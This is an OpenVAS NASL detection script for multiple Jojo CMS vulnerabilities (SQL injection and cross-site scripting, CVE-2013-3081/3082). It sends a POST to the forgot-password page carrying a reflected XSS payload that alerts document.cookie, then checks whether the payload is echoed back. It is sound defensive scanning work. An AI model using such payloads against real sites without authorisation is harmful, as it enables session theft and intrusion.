###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_jojo_cms_mult_vuln.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# Jojo CMS Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803703");
  script_version("$Revision: 11865 $");
  script_cve_id("CVE-2013-3081", "CVE-2013-3082");
  script_bugtraq_id(59934, 59933);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-05-23 15:54:25 +0530 (Thu, 23 May 2013)");
  script_name("Jojo CMS Multiple Vulnerabilities");

  script_xref(name:"URL", value:"http://secunia.com/advisories/53418");
  script_xref(name:"URL", value:"https://www.htbridge.com/advisory/HTB23153");
  script_xref(name:"URL", value:"https://xforce.iss.net/xforce/xfdb/84285");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute arbitrary SQL
  commands and execute arbitrary HTML and script code in a user's browser
  session in the context of an affected website.");
  script_tag(name:"affected", value:"Jojo CMS version 1.2 and prior");
  script_tag(name:"insight", value:"Multiple flaws due to,

  - An insufficient filtration of user-supplied input passed to the
    'X-Forwarded-For' HTTP header in '/articles/test/' URI.

  - An insufficient filtration of user-supplied data passed to 'search' HTTP
    POST parameter in '/forgot-password/' URI.");
  script_tag(name:"solution", value:"Update to Jojo CMS 1.2.2 or later.");
  script_tag(name:"summary", value:"This host is installed with Jojo CMS and is prone to multiple
  vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

port = get_http_port(default:80);

if(!can_host_php(port:port)){
  exit(0);
}

host = http_host_name(port:port);

foreach dir (make_list_unique("/", "/jojo", "/cms", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  rcvRes = http_get_cache(item:string(dir, "/"), port:port);

  if(rcvRes && '"Jojo CMS' >< rcvRes &&
     "http://www.jojocms.org" >< rcvRes)
  {
    postdata = "type=reset&search=%3E%3Cscript%3Ealert%28document.cookie" +
               "%29%3B%3C%2Fscript%3E&btn_reset=Send";

    req = string("POST ", dir, "/forgot-password/ HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata), "\r\n",
                 "\r\n", postdata);

    res = http_keepalive_send_recv(port:port, data:req);

    if(res =~ "HTTP/1\.. 200" && "><script>alert(document.cookie);</script>" >< res
       && '"Jojo CMS' >< res)
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
